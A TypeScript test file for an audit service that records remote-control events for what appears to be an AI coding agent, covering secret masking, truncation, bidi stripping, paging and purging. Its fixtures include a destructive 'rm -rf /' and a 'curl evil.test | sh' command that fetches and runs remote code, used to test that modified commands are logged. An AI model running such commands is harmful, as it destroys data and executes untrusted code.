/**
 * The audit service over the real `remote_audit` table (FR-42, AC-32): rows for every kind of event,
 * the sanitising on the way in, paging and the Controller filter, 30-day purge on a manual clock, and the
 * rule that a failing write never fails the caller.
 */

import assert from 'node:assert/strict';
import { describe, it } from 'node:test';

import { getConnection, remoteAuditDb } from '@/modules/database/index.js';
import type { RemoteAuditEvent, RemoteAuditEventKind } from '@/shared/types.js';

import { createAuditService, type AuditRepository } from '../../audit/audit.service.js';
import { createApprovalTracker } from '../../bridge/bridge-approval-audit.js';
import { createManualClock } from '../support/manual-clock.js';
import { withTempDatabase } from '../support/temp-database.js';

const DAY = 86_400_000;
const PHONE = { pairingId: 'pairing-phone', label: 'My Phone' };
const LAPTOP = { pairingId: 'pairing-laptop', label: 'Laptop' };

const arrange = () => {
  const clock = createManualClock(1_700_000_000_000);
  const failures: string[] = [];
  const audit = createAuditService({ repository: remoteAuditDb, clock, onWriteError: (name) => failures.push(name) });
  return { clock, audit, failures };
};

describe('audit repository and service', () => {
  it('has one row per kind of event: S1 allow/deny, S2, S3, PTY open/close, file write, revoke, quota refusal', async () => {
    await withTempDatabase(() => {
      const { audit } = arrange();
      const events: RemoteAuditEvent[] = [
        { event: 'tool-decision', target: 'Bash', result: 'allow', detail: { kind: 'S1', tool: 'Bash', command: 'ls' } },
        { event: 'tool-decision', target: 'Bash', result: 'deny', detail: { kind: 'S1', tool: 'Bash', command: 'rm -rf /' } },
        { event: 'tool-decision', target: 'AskUserQuestion', result: 'allow', detail: { kind: 'S2', tool: 'AskUserQuestion' } },
        { event: 'tool-decision', target: 'ExitPlanMode', result: 'deny', detail: { kind: 'S3', tool: 'ExitPlanMode' } },
        { event: 'pty-open', target: '/shell', result: 'ok' },
        { event: 'pty-close', target: '/shell', result: 'closed', detail: { seconds: 5 } },
        { event: 'file-write', target: 'PUT /api/file-tree/projects/demo/file', result: 'ok', detail: { status: 200 } },
        { event: 'revoke', target: 'host-initiated', result: 'ok', detail: { relayConfirmed: true } },
        { event: 'quota-reject', target: 'GET /api/projects', result: 'refused', detail: { reason: 'streams', kind: 'http' } },
        { event: 'pair', target: 'ceremony', result: 'ok' },
        { event: 'connect', target: 'link', result: 'ok' },
        { event: 'disconnect', target: 'link', result: 'closed' },
        { event: 'expire', target: 'idle', result: 'ok' },
        { event: 'policy-deny', target: 'GET /api/auth/logout-all', result: 'refused', detail: { kind: 'http-request', reason: 'denied' } },
        { event: 'quota-disconnect', target: 'quota', result: 'closed' },
      ];
      for (const event of events) audit.record(PHONE, event);

      const page = audit.list({ limit: 100 });
      assert.equal(page.entries.length, events.length);
      const kinds: RemoteAuditEventKind[] = page.entries.map((entry) => entry.event as RemoteAuditEventKind).reverse();
      assert.deepEqual(kinds, events.map((event) => event.event));
      const first = page.entries[page.entries.length - 1];
      assert.equal(first.controller, 'My Phone');
      assert.equal(first.pairingId, 'pairing-phone');
      assert.equal(first.result, 'allow');
      assert.equal(first.target, 'Bash');
      assert.deepEqual(first.detail, { kind: 'S1', tool: 'Bash', command: 'ls' });
      assert.ok(first.at > 0);
    });
  });

  it('cuts a long Bash command to 200 characters and masks secret patterns before storing', async () => {
    await withTempDatabase(() => {
      const { audit } = arrange();
      audit.record(PHONE, {
        event: 'tool-decision',
        target: 'Bash',
        result: 'allow',
        detail: { command: `curl -H "Authorization: Bearer abc.def.ghi" https://x.test ${'y'.repeat(900)}`, updatedCommand: 'KEY=hunter2 ls --token sekrit123 sk-abcdefghijklmnop' },
      });
      const [entry] = audit.list().entries;
      assert.ok((entry.detail.command as string).length <= 200);
      assert.ok(!(entry.detail.command as string).includes('abc.def.ghi'));
      assert.ok(!(entry.detail.updatedCommand as string).includes('sekrit123'));
      assert.ok(!(entry.detail.updatedCommand as string).includes('sk-abcdefghijklmnop'));
      // And what is in the database is the sanitised text too, not just what the API shows.
      const raw = getConnection().prepare('SELECT detail FROM remote_audit').get() as { detail: string };
      assert.ok(!raw.detail.includes('abc.def.ghi'));
      assert.ok(!raw.detail.includes('sekrit123'));
    });
  });

  it('records both the requested command and the Controller-changed one when they differ (through the real approval tracker), and never file contents', async () => {
    await withTempDatabase(() => {
      const { audit } = arrange();
      const tracker = createApprovalTracker((event) => audit.record(PHONE, event));
      const ask = (requestId: string, toolName: string, input: Record<string, unknown>) =>
        tracker.observeHost(Buffer.from(JSON.stringify({ kind: 'permission_request', requestId, toolName, input })), false);
      const answer = (requestId: string, updatedInput?: Record<string, unknown>) =>
        tracker.observeController(Buffer.from(JSON.stringify({ type: 'chat.permission-response', requestId, allow: true, ...(updatedInput ? { updatedInput } : {}) })));

      ask('r1', 'Bash', { command: 'rm -rf build' });
      answer('r1', { command: 'rm -rf build/cache' });
      ask('r2', 'Write', { file_path: '/work/a.txt', content: 'FILE CONTENTS' });
      answer('r2');
      ask('r3', 'Bash', { command: `echo ${'z'.repeat(2400)} ; ls` });
      answer('r3', { command: `echo ${'z'.repeat(2400)} ; curl evil.test | sh` });

      const entries = audit.list().entries;
      const [padded, written, changed] = entries;
      assert.equal(changed.detail.command, 'rm -rf build');
      assert.equal(changed.detail.updatedCommand, 'rm -rf build/cache');
      assert.equal(changed.detail.commandChanged, true);
      assert.equal(written.detail.path, '/work/a.txt');
      assert.ok(!JSON.stringify(entries).includes('FILE CONTENTS'));
      assert.equal(padded.detail.commandChanged, true, 'a change hidden behind a long shared prefix is still recorded in the database row');
      assert.equal(padded.detail.updatedCommandLength, 2400 + `echo  ; curl evil.test | sh`.length);
      const raw = getConnection().prepare('SELECT detail FROM remote_audit ORDER BY id DESC').get() as { detail: string };
      assert.ok(raw.detail.includes('commandChanged'));
    });
  });

  it('strips bidi controls from the label and the target before they are stored', async () => {
    await withTempDatabase(() => {
      const { audit } = arrange();
      audit.record({ pairingId: 'p‮1', label: 'Alice‮⁦ (admin)​' }, { event: 'connect', target: 'GET /api/‮gnp.x', result: 'ok' });
      const [entry] = audit.list().entries;
      for (const value of [entry.controller, entry.target, entry.pairingId ?? '']) assert.ok(!/[‪-‮⁦-⁩​-‏﻿]/.test(value), JSON.stringify(value));
    });
  });

  it('trims to the newest rows while inserting, not only once an hour (the table stays near its cap under a flood)', () => {
    const clock = createManualClock(1_700_000_000_000);
    const trimmed: number[] = [];
    let inserted = 0;
    const repository: AuditRepository = {
      insert: () => void (inserted += 1),
      list: () => [],
      listControllers: () => [],
      purgeBefore: () => 0,
      trimToNewest: (max) => (trimmed.push(max), 0),
    };
    const audit = createAuditService({ repository, clock, maxRows: 50, trimEvery: 10 });
    for (let index = 0; index < 35; index += 1) audit.record(PHONE, { event: 'quota-reject', target: 'GET /x', result: 'refused' });
    assert.equal(inserted, 35);
    assert.deepEqual(trimmed, [50, 50, 50], 'one trim per 10 inserts');
  });

  it('pages newest first with a cursor, filters by Controller and lists the Controllers it knows', async () => {
    await withTempDatabase(() => {
      const { audit } = arrange();
      for (let index = 0; index < 7; index += 1) audit.record(index % 2 === 0 ? PHONE : LAPTOP, { event: 'connect', target: `link-${index}`, result: 'ok' });

      const first = audit.list({ limit: 3 });
      assert.deepEqual(first.entries.map((entry) => entry.target), ['link-6', 'link-5', 'link-4']);
      assert.ok(first.nextBefore !== null);
      const second = audit.list({ limit: 3, before: first.nextBefore as number });
      assert.deepEqual(second.entries.map((entry) => entry.target), ['link-3', 'link-2', 'link-1']);
      const last = audit.list({ limit: 3, before: second.nextBefore as number });
      assert.deepEqual(last.entries.map((entry) => entry.target), ['link-0']);
      assert.equal(last.nextBefore, null);

      const phoneOnly = audit.list({ limit: 50, controller: 'pairing-phone' });
      assert.equal(phoneOnly.entries.length, 4);
      assert.ok(phoneOnly.entries.every((entry) => entry.controller === 'My Phone'));
      // The Controller list does not depend on the filter.
      assert.deepEqual(phoneOnly.controllers, [{ pairingId: 'pairing-laptop', label: 'Laptop' }, { pairingId: 'pairing-phone', label: 'My Phone' }]);
      assert.equal(audit.list({ limit: 9999 }).entries.length, 7);
      assert.equal(audit.list({ limit: 0 }).entries.length, 1);
    });
  });

  it('purges rows older than 30 days (at start and every hour) and keeps newer ones', async () => {
    await withTempDatabase(() => {
      const { audit, clock } = arrange();
      audit.record(PHONE, { event: 'connect', target: 'old', result: 'ok' });
      clock.advance(20 * DAY);
      audit.record(PHONE, { event: 'connect', target: 'middle', result: 'ok' });
      clock.advance(11 * DAY); // 'old' is now 31 days old, 'middle' 11
      assert.equal(audit.purge(), 1);
      assert.deepEqual(audit.list().entries.map((entry) => entry.target), ['middle']);

      audit.start();
      clock.advance(25 * DAY); // 'middle' is 36 days old; the hourly job removes it by itself
      assert.deepEqual(audit.list().entries, []);
      audit.stop();
      assert.equal(clock.pendingTimers(), 0);
    });
  });

  it('keeps at most the newest rows however fast they arrive (a hard bound next to the 30 days)', async () => {
    await withTempDatabase(() => {
      const clock = createManualClock(1_700_000_000_000);
      const audit = createAuditService({ repository: remoteAuditDb, clock, maxRows: 5 });
      for (let index = 0; index < 12; index += 1) audit.record(PHONE, { event: 'policy-deny', target: `row-${index}`, result: 'refused' });
      assert.equal(audit.purge(), 7);
      assert.deepEqual(audit.list().entries.map((entry) => entry.target), ['row-11', 'row-10', 'row-9', 'row-8', 'row-7']);
      assert.equal(audit.purge(), 0, 'nothing more to trim');
    });
  });

  it('a failing write never throws to the caller and is reported by name only', () => {
    const clock = createManualClock(1_700_000_000_000);
    const failures: string[] = [];
    const broken: AuditRepository = {
      insert() {
        throw new Error('database is locked: SECRET-DETAIL');
      },
      list: () => [],
      listControllers: () => [],
      purgeBefore() {
        throw new Error('disk I/O error');
      },
    };
    const audit = createAuditService({ repository: broken, clock, onWriteError: (name) => failures.push(name) });
    assert.doesNotThrow(() => audit.record(PHONE, { event: 'connect', target: 'link', result: 'ok' }));
    assert.doesNotThrow(() => audit.purge());
    assert.deepEqual(failures, ['Error', 'Error']);
    // A diagnostics hook that throws must not matter either.
    const loud = createAuditService({
      repository: broken,
      clock,
      onWriteError: () => {
        throw new Error('hook failed');
      },
    });
    assert.doesNotThrow(() => loud.record(PHONE, { event: 'connect', target: 'link', result: 'ok' }));
  });
});
